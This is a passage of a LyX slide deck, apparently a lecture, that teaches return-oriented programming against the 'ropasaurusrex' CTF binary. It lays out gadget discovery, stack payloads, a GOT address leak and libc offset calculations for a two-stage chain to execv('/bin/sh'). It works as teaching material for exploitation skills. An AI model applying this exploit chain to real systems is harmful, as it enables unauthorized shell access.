+\begin_layout Plain Layout
+Result
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Chaining
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+What if we want to call another function?
+\end_layout
+
+\begin_layout Itemize
+For instance another write?
+\end_layout
+
+\begin_layout Itemize
+Parameters would overlap!
+\end_layout
+
+\begin_layout Itemize
+We need to clean parameters for the first call
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+We need a...
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+\begin_inset Graphics
+	filename img/gadget.png
+	lyxscale 10
+	height 80pheight%
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Gadgets
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+We need several POP instructions
+\end_layout
+
+\begin_layout Itemize
+At least 
+\begin_inset Formula $3$
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+Followed by a RET, so we get control again
+\end_layout
+
+\begin_layout Itemize
+We can only search in the main executable
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ objdump -d ropasaurusrex -M intel-mnemonic 
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+          --no-show-raw-insn 
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\begin_layout Plain Layout
+
+ 80484b5:       pop    ebx
+\end_layout
+
+\begin_layout Plain Layout
+
+ 80484b6:       pop    esi
+\end_layout
+
+\begin_layout Plain Layout
+
+ 80484b7:       pop    edi
+\end_layout
+
+\begin_layout Plain Layout
+
+ 80484b8:       pop    ebp
+\end_layout
+
+\begin_layout Plain Layout
+
+ 80484b9:       ret
+\end_layout
+
+\begin_layout Plain Layout
+
+...
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+There they are
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Note: there are four of them, we'll add another 
+\begin_inset Quotes eld
+\end_inset
+
+parameter
+\begin_inset Quotes erd
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+# First call
+\end_layout
+
+\begin_layout Plain Layout
+
+0804830c # Write address
+\end_layout
+
+\begin_layout Plain Layout
+
+080484b5 # POP, POP, POP, POP, RET
+\end_layout
+
+\begin_layout Plain Layout
+
+00000001 # stdout
+\end_layout
+
+\begin_layout Plain Layout
+
+08048001 # Address of "ELF"
+\end_layout
+
+\begin_layout Plain Layout
+
+00000003 # Bytes to write
+\end_layout
+
+\begin_layout Plain Layout
+
+B00BB00B # Useless parameter
+\end_layout
+
+\begin_layout Plain Layout
+
+# Second call
+\end_layout
+
+\begin_layout Plain Layout
+
+0804830c # Write address
+\end_layout
+
+\begin_layout Plain Layout
+
+BBBBBBBB # Final return
+\end_layout
+
+\begin_layout Plain Layout
+
+00000001 # stdout
+\end_layout
+
+\begin_layout Plain Layout
+
+08048001 # Address of "ELF"
+\end_layout
+
+\begin_layout Plain Layout
+
+00000003 # Bytes to write
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+New chain
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ python phase3.py | ./ropasaurusrex
+\end_layout
+
+\begin_layout Plain Layout
+
+ELFELFSegmentation fault
+\end_layout
+
+\begin_layout Plain Layout
+
+$ dmesg | tail -n1
+\end_layout
+
+\begin_layout Plain Layout
+
+ropasaurusrex[...]: segfault at bbbbbbbb ip 00000000bbbbbbbb sp [...] error 14
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Result
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Subsection
+Let's get serious
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+The attack
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+We want to do an 
+\family typewriter
+execv
+\end_layout
+
+\begin_layout Itemize
+Its position w.r.t.
+ to 
+\family typewriter
+write
+\family default
+ is constant!
+\end_layout
+
+\begin_layout Itemize
+Let's try to get the real position of 
+\family typewriter
+write
+\family default
+!
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+$ objdump -d ropasaurusrex -M intel-mnemonic 
+\backslash
+
+\end_layout
+
+\begin_layout Plain Layout
+
+          --no-show-raw-insn
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+0804830c <write@plt>:
+\end_layout
+
+\begin_layout Plain Layout
+
+ 804830c:       jmp    DWORD PTR ds:0x8049614
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048312:       push   0x8
+\end_layout
+
+\begin_layout Plain Layout
+
+ 8048317:       jmp    80482ec
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Back to write@plt
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\align center
+At 
+\family typewriter
+0x8049614
+\family default
+ we'll have the address of 
+\family typewriter
+write
+\family default
+!
+\end_layout
+
+\begin_layout Standard
+\align center
+Let's print it!
+\end_layout
+
+\end_deeper
+\begin_layout Frame
+
+\end_layout
+
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+0804830c # Write address
+\end_layout
+
+\begin_layout Plain Layout
+
+BBBBBBBB # Final return
+\end_layout
+
+\begin_layout Plain Layout
+
+00000001 # stdout
+\end_layout
+
+\begin_layout Plain Layout
+
+08049614 # Address of got(write)
+\end_layout
+
+\begin_layout Plain Layout
+
+00000004 # Bytes to write
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+$ python phase4.py | ./ropasaurusrex | hexdump -C
+\end_layout
+
+\begin_layout Plain Layout
+
+00000000  d0 9d 6f f7 |..o.|
+\end_layout
+
+\begin_layout Plain Layout
+
+00000004
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Let's get it
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\align center
+
+\size larger
+It's at 
+\family typewriter
+0xf76f9dd0
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+And now?
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Our script needs to read this value
+\end_layout
+
+\begin_layout Itemize
+Make the program rejump at its beginning
+\end_layout
+
+\begin_layout Itemize
+Compute the position of execv
+\end_layout
+
+\begin_layout Itemize
+Call it
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+We also need some other stuffs
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+
+\family typewriter
+execv(
+\begin_inset Quotes eld
+\end_inset
+
+/bin/sh
+\begin_inset Quotes erd
+\end_inset
+
+, pointer_to_null)
+\end_layout
+
+\begin_layout Itemize
+\begin_inset Quotes eld
+\end_inset
+
+
+\family typewriter
+/bin/sh
+\family default
+
+\begin_inset Quotes erd
+\end_inset
+
+ is in the libc
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+pointer_to_null
+\family default
+s are everywhere
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Recap
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+
+\family typewriter
+write
+\family default
+ is in libc at 
+\family typewriter
+0x000cfdd0
+\family default
+ 
+\begin_inset Formula $\left(\text{write\_offset}\right)$
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+execv
+\family default
+ is in libc at 
+\family typewriter
+0x000a7360
+\family default
+ 
+\begin_inset Formula $\left(\text{execv\_offset}\right)$
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+\begin_inset Quotes eld
+\end_inset
+
+
+\family typewriter
+/bin/sh
+\family default
+
+\begin_inset Quotes erd
+\end_inset
+
+ is in libc at 
+\family typewriter
+0x00139dcb
+\family default
+ 
+\begin_inset Formula $\left(\text{binsh\_offset}\right)$
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+
+\family typewriter
+pointer_to_null
+\family default
+ is in our executable at 
+\family typewriter
+0x08048008
+\family default
+
+\begin_inset Foot
+status open
+
+\begin_layout Plain Layout
+Right after the ELF header
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Remember!
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+
+\size larger
+You have to find the addresses in your own libc!
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+0804830c # Write address
+\end_layout
+
+\begin_layout Plain Layout
+
+080484b5 # POP, POP, POP, POP, RET
+\end_layout
+
+\begin_layout Plain Layout
+
+00000001 # stdout
+\end_layout
+
+\begin_layout Plain Layout
+
+08049614 # Address of got(write)
+\end_layout
+
+\begin_layout Plain Layout
+
+00000004 # Bytes to write
+\end_layout
+
+\begin_layout Plain Layout
+
+0804841d # Main of the program
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+First stage
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+Steps:
+\end_layout
+
+\begin_layout Itemize
+
+Print the address of write
+\end_layout
+
+\begin_layout Itemize
+
+Make the control go back to the 
+\family typewriter
+main
+\family default
+ function
+\end_layout
+
+\begin_layout Standard
+
+\begin_inset VSpace bigskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Standard
+
+\lang italian
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+defverbatim[colored]
+\backslash
+mycode{
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "breaklines=true"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+f76d1360 # execv_real
+\end_layout
+
+\begin_layout Plain Layout
+
+BBBBBBBB # Final return
+\end_layout
+
+\begin_layout Plain Layout
+
+f7763dcb # binsh_real
+\end_layout
+
+\begin_layout Plain Layout
+
+08048008 # pointer to NULL
+\end_layout
+
+\end_inset
+
+
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+}
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Second stage of the attack
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+Steps:
+\end_layout
+
+\begin_layout Itemize
+Read the address of write
+\end_layout
+
+\begin_layout Itemize
+Compute the address of 
+\family typewriter
+execv
+\family default
+ and 
+\family typewriter
+
+\begin_inset Quotes eld
+\end_inset
+
+/bin/sh
+\begin_inset Quotes erd
+\end_inset
+
+
+\end_layout
+
+\begin_layout Itemize
+Launch another payload
+\end_layout
+
+\begin_layout Standard
+
+\begin_inset VSpace bigskip
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+mycode
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset Formula 
+\begin{gather*}
+\text{execv\_real}=\left(\text{write\_real}-\text{write\_offset}\right)+\text{execv\_offset}\\
+\text{binsh\_real}=\left(\text{write\_real}-\text{write\_offset}\right)+\text{binsh\_offset}
+\end{gather*}
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+Final step
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Itemize
+Now we should have a shell
+\end_layout
+
+\begin_layout Itemize
+Send 
+\begin_inset Quotes eld
+\end_inset
+
+exec ls
+\begin_inset Quotes erd
+\end_inset
+
+ and you're done
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout PlainFrame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+
+\size giant
+Demo
+\end_layout
+
+\end_deeper
+\begin_layout Separator
+
+\end_layout
+
+\begin_layout Frame
+\begin_inset Argument 4
+status open
+
+\begin_layout Plain Layout
+License
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\align center
+\begin_inset Graphics
+	filename common/by-sa.eps
+	width 25col%
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+This work is licensed under the Creative Commons Attribution-ShareAlike
+ 4.0 International License.
+ To view a copy of this license, visit 
+\begin_inset CommandInset href
+LatexCommand href
+target "http://creativecommons.org/licenses/by-sa/4.0/"
+
+\end_inset
+
+.
+\end_layout
+
+\end_deeper
+\end_body
+\end_document
